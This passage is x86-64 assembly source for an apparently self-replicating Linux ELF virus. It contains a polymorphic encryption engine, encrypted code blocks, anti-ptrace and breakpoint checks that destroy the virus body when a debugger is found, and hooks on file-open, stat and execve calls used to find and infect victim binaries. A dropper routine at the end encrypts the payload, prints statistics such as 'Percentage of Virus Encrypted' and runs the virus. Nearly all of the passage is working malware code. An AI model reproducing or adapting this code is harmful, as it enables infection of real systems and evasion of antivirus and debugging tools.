		END_EBLOCK
		VIRUS_DEBUG_STRING -RDA_Encode
		ret

;-[RDA_Decode]----------------------------------------------------------------
; Decode RCX bytes at RSI using Random Decoding Algorithm
ADD_FUNCTION
RDA_Decode:	VIRUS_DEBUG_STRING +RDA_Decode
		BEGIN_EBLOCK
		call	_pusha
		xor	edx,edx
	.crc_loop:	push	rdx
			call	j_eblock_crypt
			xor	edx,edx
			call	CRC32
			cmp	edx,[rcx+rsi]
			pop	rdx
			je	.exit
			call	j_eblock_crypt
			inc	edx
			cmp	dh,RDA_HIGH_BYTE
			ja	.error
			jmp	.crc_loop
	.exit:	call	_popa
		END_EBLOCK
		VIRUS_DEBUG_STRING -RDA_Decode
		ret

	.error:	call	negstr_exit
		negstr	""
		negstr	"Break screen in case of virus writer gone mad."
		db	0

;-[anti_ptrace1]--------------------------------------------------------------
; see if ptrace(PTRACE_ATTACH,...) fails.
ADD_FUNCTION
anti_ptrace1:
%if RETAL_ANTI_PTRACE1 == RETAL_ENABLED
		VIRUS_DEBUG_STRING +anti_ptrace1
		BEGIN_EBLOCK
		;CHECK_BREAKPOINT
		call	_pusha
		_syscall_al 39		; getpid
		push	rax
		pop	rsi
		mov	rdi,PR_SET_PTRACER
		_syscall_al 157		; prcntl
		_syscall_al 57		; fork
		jc	_terminate
		test	rax,rax
		END_EBLOCK
		jz	.child
		BEGIN_EBLOCK
		or	rdi,-1
		lea	rsi,[.status]
		xor	rdx,rdx
		xor	r10,r10
		_syscall_al 61		; wait4
		lodsd
		test	ah,ah
%if RETAL_PTRACE_CRAZY == RETAL_ENABLED
		jnz	.exit
		mov	al,3
		call	rand_al
		jnz	_terminate
	.crazy:	push	-1
		pop	rdi
		push	rdi
		push	rdi
		pop	rsi
		pop	rdx
		call	rand_any
		and	ah,1
		call	__syscall_ax
		jmp	.crazy
%else
		jz	_terminate
%endif
	.exit:	call	_popa
		END_EBLOCK
		ret

.status:		dq	0
ADD_FUNCTION
	.child:	BEGIN_EBLOCK
		jc	.term
		_syscall_al 110		; getppid
		push	rsi
		pop	rax
		push	PTRACE_ATTACH
		pop	rdi
		xor	rdx,rdx
		xor	r10,r10
		_syscall_al 101		; ptrace
		jnc	.noptrace
		xor	edi,edi		; exit(0) if ptrace
		jmp	.term
	.noptrace:
		inc	edi		; PTRACE_DETACH
	.l:	_syscall_al 101		; ptrace
		jc	.l
		; exit(PTRACE_DETACH) if not ptrace
	.term:	END_EBLOCK
		jc	.ret
		_syscall_al 60		; exit
	.ret:	ret
%endif


;-[poly engine code]----------------------------------------------------------
POLY_START:
%include "retal-poly-code.inc"
POLY_SIZE	equ	($ - POLY_START)

;-[check_breakpoint]----------------------------------------------------------
; Check for debugger breakpoint before function return, trash virus if so.
%if RETAL_BREAKPOINT_CHECK == RETAL_ENABLED
ADD_FUNCTION
check_breakpoint:
		push	rax
		mov	rax,[rsp+8+8+8]	; RAX,RIP,FLAGS,[RET RIP]
		cmp	byte [rax],0xCC
		je	.trash
		mov	eax,[rsp+8+8]	; RAX,RIP,[FLAGS]
		test	ah,1
		jnz	.trash
		mov	rax,[rsp+8]	; RAX,[RIP]
		cmp	byte [rax],0x9D
		je	.exit
	.trash:	cld
		lea	rdi,[virus_start]
		mov	ecx,virus_m_size / 4
		rep	stosd
	.exit:	pop	rax
		ret

_SIZE	equ	($ - check_breakpoint)
%endif

;-[print_debug_string]--------------------------------------------------------
; debug string at return address.
%if RETAL_POLY_DEBUG == RETAL_ENABLED ||  RETAL_VIRUS_DEBUG == RETAL_ENABLED
ADD_FUNCTION
print_debug_string:
		call	_pusha
		cld
		mov	rsi,[rsp+PUSHA_STACK_size]
		lodsw
		movzx	rdx,ax
		lea	rax,[rdx+rsi]
		mov	[rsp+PUSHA_STACK_size],rax ; return rip
		push	STDOUT
		pop	rdi
		;_syscall_al 1	; write
		push	1
		pop	rax
		syscall
		call	_popa
		ret
%endif

;-[dump_encryptor]------------------------------------------------------------
; dump encryptor to disk: *.enc
%if RETAL_POLY_DUMP_ENCRYPT == RETAL_ENABLED
ADD_FUNCTION
dump_encryptor:	call	_pusha
		lea	rdi,[g_enc_filename]
		mov	esi,O_RDWR|O_CREAT|O_TRUNC
		mov	edx,S_IRUSR|S_IWUSR
		_syscall_al 2		; open
		jb	.exit
		push	rax
		pop	rdi
		mov	rsi,[g_Poly_Encryptor_Handle+MALLOC_HANDLE.addr]
		mov	rdx,[rsp+PUSHA_STACK.r13]
		sub	rdx,rsi
		_syscall_al 1 ; write
		_syscall_al 3 ; close
	.exit:	call	_popa
		ret

enc_file_num_rdi:	dq	0
%endif

;-[print_rdi_r13]-------------------------------------------------------------
; dump rdi, r13 during poly engine execution
%if RETAL_POLY_DEBUG_RDI_R13 == RETAL_ENABLED
ADD_FUNCTION
print_rdi_r13:	call	_pusha
		cld
		lea	rdi,[_rdi_str]
		mov	rbx,[rsp+PUSHA_STACK.rdi]
		call	_hex_rbx_rdi
		lea	rdi,[_r13_str]
		mov	rbx,[rsp+PUSHA_STACK.r13]
		call	_hex_rbx_rdi
		push	STDOUT
		pop	rdi
		lea	rsi,[rdi_r13_string]
		push	rdi_r13_string_len
		pop	rdx
		_syscall_al 1 ; write
		call	_popa
		ret

_hex_rbx_rdi:	push	16
		pop	rcx
	.l:		rol	rbx,4
			mov	al,0xF
			and	al,bl
			add	al,'0'
			cmp	al,'9'
			jbe	.nl
			add	al,'a' - ('9' + 1)
		.nl:	stosb
			loop	.l
		ret

rdi_r13_string: 	db "RDI: 0x"
	_rdi_str:	times 16 db 0
			db " R13: 0x"
	_r13_str:	times 16 db 0
			db NEWLINE
rdi_r13_string_len	equ	($ - rdi_r13_string)
%endif

;-[Exit Variables]------------------------------------------------------------
g_terminate_address:		dq	0
g_terminate_rsp:		dq	0		; RSP on Exit

g_terminate_infection_address:	dq	0
g_terminate_infection_rsp:	dq	0

state_i:        dd 0
STATE:          times 0x10 dd 0

align	4
virus_p_end:
;-[Begin BSS]-----------------------------------------------------------------
virus_bss_start:

;-[Infection Variables]-------------------------------------------------------
;
g_fd_in:		dq	0		; fd of victim
g_fd_out:		dq	0		; fd of out file.

g_infection_status:	dd	0		; 0 for no cleanup,1 for unlink tmp,2 for replace host

g_text_index:		dd	0		; index of .text section
g_data_index:		dd	0
g_bss_index:		dd	0
g_plt_index:		dd	0
g_dynamic_index:	dd	0
g_prelink_undo_index:	dd	0
g_rela_dyn_index:	dd	0
g_rodata_index:		dd	0

g_dynsym_index:		dd	0

g_dynsym_strtab_index:	dd	0

g_o_bss_index:		dd	0

g_text_symboln:		dd	0
g_data_symboln:		dd	0
g_o_bss_symboln:	dd	0

g_lxstat64_index:	dd	0
g_openat2_index:	dd	0
g_xstat64_index:	dd	0
g_lxstat_index:		dd	0
g_xstat_index:		dd	0
g_fopen_index:		dd	0
g_fopen64_index:	dd	0
g_open_index:		dd	0
g_open64_index:		dd	0
g_bfd_openr_index:	dd	0
g_execve_index:		dd	0
%if RETAL_HOOK_SIGNAL == RETAL_ENABLED
g_signal_index:		dd	0
g_sigaction_index:	dd	0
%endif

g_lxstat64_target:	dq	0
g_openat2_target:	dq	0
g_xstat64_target:	dq	0
g_lxstat_target:	dq	0
g_xstat_target:		dq	0
g_fopen_target:		dq	0
g_fopen64_target:	dq	0
g_open_target:		dq	0
g_open64_target:	dq	0
g_bfd_openr_target:	dq	0
g_execve_target:	dq	0
%if RETAL_HOOK_SIGNAL == RETAL_ENABLED
g_signal_target:	dq	0
g_sigaction_target:	dq	0
%endif

g_checksum_ptr:		dq	0
g_prelinked_ptr		dq	0

g_shdrs_size:		dq	0
g_phdrs_size:		dq	0

g_target_phdr:		dq	0		; ptr to target phdr
g_max_phdr_vaddr:	dq	0
g_phdr_align:		dq	0

g_bss_has_relocs:	db	0

g_inputfilename_ptr:	dq	0		; ptr to input filename

g_outputfilename_buf:	times (MAX_PATH+1) db 0	; output filename

%if RETAL_POLY_DUMP_ENCRYPT == RETAL_ENABLED
g_enc_filename:		times (MAX_PATH+1) db 0 ; encryptor dump filename
%endif

g_Elf64_Ehdr:	IStruc	Elf64_Ehdr	; Elf64_Ehdr of victim
		IEnd

g_statbuf:	IStruc	stat		; stat buf
		IEnd

g_new_symbol:	ISTRUC Elf64_Sym
		IEND

g_new_rel:	ISTRUC Elf64_Rela
		IEND

g_shdr_index_list:	times MAX_SHDR_COUNT dd 0

g_section_reloc_list:	times MAX_SHDR_COUNT dd 0

align	4
virus_file_bss_end:
;-[Begin BSS After Infection Variables]---------------------------------------
g_virus_status:		dd	0		; initalised or terminated?

g_pusha_popa_return:	dq	0

g_file_type:		db	0
g_last_fname_hash:	dd	0

g_fd_dir:		dq	0

g_direct_action_timeout:dq	0

g_hook_use_RSI:		db	0

g_poly_setup_done:	db	0

g_terminate_chdir:	dd	0

g_host_date:		dq	0
g_do_activate:		db	0

g_orig_lxstat64:	dq	0
g_orig_openat2:		dq	0
g_orig_xstat64:		dq	0
g_orig_lxstat:		dq	0
g_orig_xstat:		dq	0
g_orig_fopen:		dq	0
g_orig_fopen64:		dq	0
g_orig_open:		dq	0
g_orig_open64:		dq	0
g_orig_bfd_openr:	dq	0
g_orig_execve:		dq	0
%if RETAL_HOOK_SIGNAL == RETAL_ENABLED
g_orig_signal:		dq	0
g_orig_sigaction:	dq	0
%endif

g_rehook_target		dq	0
g_rehook_function	dq	0
g_rehook_call		dq	0

%if RETAL_PATCH_EXE_TEXT == RETAL_ENABLED
g_exe_prolog_patch_sum:	dw	0
g_exe_cmp_rax_patch_sum:dw	0
%endif

g_btea_enc_key:		dd	0		; 36
			dd	0		; 40
			dd	0		; 44
			dd	0		; 48

g_tmp_ext:		dq	0		; Temp file exstension.

g_sa:			IStruc	sigaction	; sa for signal handler
			IEnd

g_da_buf:		times 64 db 0

g_last_fsize:		dd	0		; size of last file infected
g_last_fsize_delta:	dd	0		; delta of size of last file infected
g_last_fsize_count:	dd	0		; count of same delta in a row

g_cur_fname_sum:	dd	0		; name checksum of current file
g_last_fname_sum:	dd	0		; name checksum of last file
g_last_fname_delta:	dd	0		; delta of last filename
g_last_fname_count:	dd	0		; count of same fname delta in a row

g_last_text_CRC32:	dd	0		; crc32 of last .text section
g_last_text_CRC32_count:dd	0		; number of files with same text
						; section in a row.
g_patched_prolog_rip:	dq	0		; rip after patched rbp prolog

g_int3_call_return:	dq	0

g_func_sym_entry:	dq	0

g_poly_exe_layers:	dd	0

g_poly_load_addr:	dq	0	; mem address of virus phdr in executables
					; offset in .text of decrypt in .o files

g_poly_in_size:		dq	0
g_poly_out_size:	dq	0

g_poly_in_rip:		dq	0	; RIP for decryptor to return to
g_poly_out_rip:		dq	0	; RIP of decryptor code on return

g_poly_entry_offset:	dd	0

g_exe_crypt_level:	db	0
g_o_crypt_level:	db	0
g_junk_level:		db	0

g_word_size:		db	0

g_poly_text_crypt_op:	db	0

g_bytereg_table:	times 8 db 0	; must be in this order
g_wordreg_table:	times 8 db 0	; must be in this order
g_rexreg_table:		times 8 db 0	; must be in this order

g_poly_flags:		dd	0	; must be in this order
g_byteregs:		db	0	; must be in this order
g_wordregs:		db	0	; must be in this order
g_r_regs:		db	0	; must be in this order
			db	0	; must be in this order

g_poly_call_depth:	db	0	; must be in this order

g_poly_mem_reg_dx:	dw	0	; must be in this order
g_poly_mem_reg_write:	db	0
g_poly_last_mem_write:	db	0

g_poly_pushed_mem_reg:	db	0

g_text_reg:		db	0
g_key_reg:		db	0
g_keymod_reg:		db	0

g_src_reg:		db	0	; must be in this order
g_dest_reg:		db	0

g_count_reg:		db	0	; must be in this order
g_count_size:		db	0

g_key_init_value:	dd	0
g_keymod_init_value:	dd	0

g_loop_method:		dq	0

g_poly_call_virus_reg:	db	0

g_poly_check_value:	dd	0
g_poly_check_init_value:dd	0
g_poly_check_condition:	db	0

g_poly_mmap_size:	dd	0

g_poly_dloop_start:	dq	0
g_poly_eloop_start:	dq	0
g_poly_dloop_end:	dq	0

g_poly_o_check_rel32:	dq	0
g_poly_mmap_rel32:	dq	0

g_poly_o_check_size:	db	0

g_poly_data_offset	dq	0

g_max_junk_rdi:		dq	0

g_poly_stack_var_count:	db	0

g_current_stack_count:	db	0
g_max_stack_count:	db	0

g_poly_bss_base:	dq	0
g_poly_bss_size:	dq	0

g_poly_data_base:	dq	0
g_poly_data_size:	dq	0

g_poly_rodata_base:	dq	0
g_poly_rodata_size:	dq	0

g_poly_first_call:	dq	0
g_poly_current_call:	dq	0

g_poly_header_start:	dq	0	; junk subs before decryptor
g_poly_header_end:	dq	0
g_poly_tail_start:	dq	0	; junk subs after decryptor
g_poly_tail_end:	dq	0

g_poly_syscall:		dq	0
g_poly_syscall_rdi:	dq	0

g_poly_entry_rdi:	dq	0
g_poly_entry_8:		dq	0

%if RETAL_EBLOCKS == RETAL_ENABLED
g_EBLOCK_index:		dd	0
g_EBLOCK_STACK:		times MAX_EBLOCK_DEPTH dq 0
%endif

g_func_sym_list:	times MAX_FUNC_SYM_COUNT dq 0

g_cwd_buf:		times (MAX_PATH+1) db 0	; current directory

g_sysinfo:		times (512) db 0	; sysinfo structure

g_poly_push_pop_seq:	times 15 dw 0

g_poly_junk_calls:
		%rep 256
		IStruc	JUNK_CALL
		IEnd
		%endrep

; Begin MALLOC_HANDLE_LIST
MALLOC_HANDLE_LIST:
g_phdrs_handle:	IStruc	MALLOC_HANDLE	; malloc() handle to PHdrs
		IEnd

g_shdrs_handle:	IStruc	MALLOC_HANDLE	; malloc() handle to SHdrs
		IEnd

g_CopyEntire_handle:
		IStruc	MALLOC_HANDLE	; malloc() handle to copy entire file.
		IEND

g_VirusBody_Handle:
		IStruc	MALLOC_HANDLE	; malloc() handle to output virus image.
		IEnd

g_Poly_Virus_Handle:
		IStruc	MALLOC_HANDLE
		IEnd

g_Poly_Encryptor_Handle:
		IStruc	MALLOC_HANDLE
		IEnd

g_CRC32_Handle:	IStruc	MALLOC_HANDLE
		IEnd

g_dirent_Handle:IStruc	MALLOC_HANDLE
		IEnd

g_SectionImages_Handle:			; array of malloc() handles - section images
		%rep MAX_SHDR_COUNT
		IStruc	MALLOC_HANDLE
		IEnd
		%endrep
MALLOC_HANDLE_LIST_END:

align	4
virus_bss_end:
;-[Begin Virus Dropper]-------------------------------------------------------
align	PAGE_SIZE

; print line macro
%macro dprintl 3
	mov	rsi,%1
	mov	ebx,%2
	mov	rcx,%3
	call	dropper_print_line
%endmacro

_start:		; mprotect(v_start aligned, virus+host size, PROT_READ|PROT_WRITE|PROT_EXEC)
		lea	rdi,[virus_start]
		and	rdi,-PAGE_SIZE
		lea	rsi,[END_DROPPER]
		sub	rsi,rdi
		mov	rdx,PROT_READ|PROT_WRITE|PROT_EXEC
		;bp_syscall_al 10	; mprotect
		mov	rax,10
		syscall
		cmp	rax,-4095
		jnb	.exit
		xor	rdi,rdi
		mov	rax,201	; time
		lea	rdi,[h_entropy]
		mov	rax,[rdi]
		add	rax,[rdi+8]
		mov	[entropy1],rax
		syscall
		call	h_rand_init
%if RETAL_EBLOCKS == RETAL_ENABLED
		; Encrypt EBLOCK crypt op table
		xor	rbx,rbx
		lea	rdi,[eblock_crypt_ops]
	.eblock_op_loop:mov	dx,[rbx+rdi]
			add	dh,bl
			adc	dl,bl
			neg	dx
			mov	[rbx+rdi],dx
		add	rbx,2
		cmp	bl,64
		jb	.eblock_op_loop
		; Encrypt each EBLOCK
		mov	ecx,EBLOCK_COUNT
		lea	rsi,[EBLOCK_Table]
	.eblock_loop:	lodsq
			mov	dword [g_EBLOCK_index],1
			mov	[g_EBLOCK_STACK],rax
			movzx	ebp,word [rax+EBLOCK_HANDLE.size]
			add	[h_BytesEncrypted],ebp
			call	exit_eblock
			loop	.eblock_loop
		; Calculate Encrypted Bytes Percentage
		mov	eax,[h_BytesEncrypted]
		mov	[h_fTMP],eax
		mov	eax,virus_p_size
		fild	dword [h_fTMP]
		mov	[h_fTMP],eax
		fild	dword [h_fTMP]
		fdivp	st1,st0
		fmul	dword [h_f100]
		fistp	dword [h_fTMP]
%else
		mov	dword [h_fTMP],0
%endif

		; Encrypt Poly Junk Syscall Table
		push	JUNK_SYSCALLS_COUNT
		pop	rcx
		lea	rsi,[junk_syscall_table]
	.junk_syscall_loop:
			call	rand_any
			mov	[rsi+JUNK_SYSCALL.rand_pad],ax
			push	rcx
			push	JUNK_SYSCALL_size - 4
			pop	rcx
			call	h_RDA_Encode
			pop	rcx
			add	rsi,JUNK_SYSCALL_size
			loop	.junk_syscall_loop
%if RETAL_BTEA_DATA == RETAL_ENABLED
		lea	rsi,[exe_data_addr]
		push	12
		pop	rcx
		call	h_RDA_Encode
%endif
%if RETAL_PATCH_EXE_TEXT == RETAL_ENABLED
		lea	rsi,[exe_prolog_patch_sum]
		push	4
		pop	rcx
		call	h_RDA_Encode
%endif
		; Print message/stats
		dprintl h_StrVirusName,-1,NULL				; Virus Name
		dprintl NULL,-1,NULL					; Blank Line
		dprintl h_StrPhysz,virus_p_size,h_StrBytes		; Physical Size
		dprintl h_StrMemsz,virus_m_size,h_StrBytes		; Memory Size
		dprintl h_StrPolysz,POLY_SIZE,h_StrBytes		; Poly engine size
		dprintl h_StrEBLOCKNum,EBLOCK_COUNT,h_StrBlocks		; Number of EBLOCKS
		dprintl h_StrEBLOCKOpcode,EBLOCK_OPCODE_COUNT,NULL	; Number of EBLOCK's using invalide opcodes
		dprintl h_StrEBLOCKBytes,[h_BytesEncrypted],h_StrBytes	; Number of Bytes in total EBLOCKS
		dprintl h_StrEBLOCKSPercent,[h_fTMP],h_StrPercent	; Percentage of Virus encrypted (EBLOCKS)
		dprintl h_StrFUNCNum,FUNC_COUNT,h_StrFunctions		; Number of Functions in virus.
		dprintl h_StrSYSCALLNum,SYSCALL_COUNT,NULL		; Number of SYSCALLS made
		dprintl h_StrBPSYSCALLNum,BP_SYSCALL_COUNT,NULL		; Number of SYSCALLS made
		dprintl h_StrBreakPointNum,BP_CHECK_COUNT,h_StrLocations; Number of locations checking for breakpoint on return
		dprintl h_StrINT3CallNum,INT3_CALL_COUNT,h_StrLocations	; Number of calls made using INT3 (0xCC)
		dprintl h_StrJunkSyscalls,JUNK_SYSCALLS_COUNT,NULL	; Number of SYSCALLs that can be generated by poly engine
		dprintl NULL,-1,NULL					; Blank Line
		; call virus and exit
		call	o_entry
	.exit:	; exit(0)
		xor	rdi,rdi
		;bp_syscall_al 60	; exit
		mov	rax,60
		syscall

; Dropper Print Line.
; rsi = prefix, ebx = integer, rcx = postfix, then NEWLINE
; rsi/rcx = NULL if empty, rc x= -1 if empty
dropper_print_line:
		call	_pusha
		call	dropper_print
		cmp	ebx,-1
		je	.do_post
		call	dropper_itoa
		mov	rsi,h_StrNumber
		call	dropper_print
	.do_post:push	rcx
		pop	rsi
		call	dropper_print
		mov	rsi,h_StrNEWLINE
		call	dropper_print
	.exit:	call	_popa
		ret

; Dropper Print String.
; RSI = hString
dropper_print:	call	_pusha
		test	rsi,rsi
		jz	.exit
		lodsw		; Buffer
		movzx	rdx,ax	; Count
		push	STDOUT
		pop	rdi	; fd
		;bp_syscall_al 1	; write
		mov	rax,1
		syscall
	.exit:  call	_popa
		ret

; Dropper Int To ASCII
; EBX = Integer (max 99,999)
; output to h_StrNumber
dropper_itoa:	call	_pusha
		mov	rdi,h_StrNumberChars
		mov	word [(rdi-h_StrNumberChars)+h_StrNumber],1
		mov	byte [rdi],'0'
		test	ebx,ebx
		jz	.exit
		push	9
		pop	rsi
		push	5
		pop	rcx
	.size_loop:	cmp	ebx,esi
			jbe	.size_found
			inc	word [(rdi-h_StrNumberChars)+h_StrNumber]
			imul	esi,esi,10
			add	esi,9
			loop	.size_loop
	.size_found:
		movzx	rcx,word [(rdi-h_StrNumberChars)+h_StrNumber]
		lea	rdi,[rdi+rcx-1]
		push	10
		pop	rsi
		push	rbx
		pop	rax
		std
	.char_loop:	xor	edx,edx
			div	esi
			xchg	edx,eax
			add	al,'0'
			stosb
			xchg	edx,eax
			loop	.char_loop
	.exit:	call	_popa
		ret

h_rand_init:	multipush rdi,rsi,rax,rdx,rcx
		and	dword [state_i],0
		lea	rdi,[STATE]
		lea	rsi,[virus_start]	; rdi = STATE
		xor	rdx,rdx
		mov	rcx,(state_i - virus_start)
	.vl:		lodsb
			adc	[rdi+rdx],al
			jc	.nr
			rol	al,3
		.nr:	inc	dl
			and	dl,63
			loop	.vl
		multipop rdi,rsi,rax,rdx,rcx
		ret

h_CRC32:	or	edx,-1
	.ByteLoop:	lodsb
			mov	ah,8
			xor	dl,al
		.BitLoop:	shr	edx,1
				jnc	.NoXOR
				xor	edx,CRC32_POLY
			.NoXOR:	dec	ah
				jnz	.BitLoop
			loop	.ByteLoop
		not edx
                ret

h_RDA_Encode:	multipush rsi,rcx,rax
		call	h_CRC32
		multipop rsi,rcx,rax
		mov	[rsi+rcx],edx
	.no_crc:call	_pusha
		call	rand_any
		movzx	edx,ax
		and	dh,RDA_HIGH_BYTE
		call	j_eblock_crypt
		call	_popa
		ret

; Dropper Data
h_StrNumber:		dw	0
h_StrNumberChars:	times 5 db 0

h_StrVirusName:		hString VIRUS_NAME_STRING
h_StrPhysz:		hString "Physical Virus Size: "
h_StrMemsz:		hString "Memory Virus Size: "
h_StrPolysz		hString "Polymorphic Engine Size: "
h_StrEBLOCKNum:		hString "Number of Encrypted Blocks: "
h_StrEBLOCKBytes:	hString "Number of Bytes In Encrypted Blocks: "
h_StrEBLOCKSPercent:	hString "Percentage of Virus Encrypted: "
h_StrFUNCNum:		hString "Number of Functions In Virus: "
h_StrEBLOCKOpcode:	hString	"Number of EBLOCK's using invalid opcodes: "
h_StrSYSCALLNum:	hString "Number of SYSCALL's made: "
h_StrBPSYSCALLNum:	hString "Number of SYSCALL's made using BPICE (0xF1): "
h_StrBreakPointNum:	hString "Number of Checks for Debugger Breakpoint: "
h_StrINT3CallNum:	hString "Number of CALLs made using INT3 (0xCC): "
h_StrJunkSyscalls	hString	"Number of junk SYSCALL's generated by Poly engine: "

h_StrBytes:	hString " bytes."
h_StrBlocks:	hString " blocks."
h_StrFunctions:	hString " functions."
h_StrLocations:	hString	" locations."
h_StrPercent:	hString "%"

h_StrNEWLINE:	dw 1
		db NEWLINE

h_fTMP		dd	0
h_f100		dd	100.0

h_BytesEncrypted:	dd 	0

h_entropy:	dq	0,0
END_DROPPER:

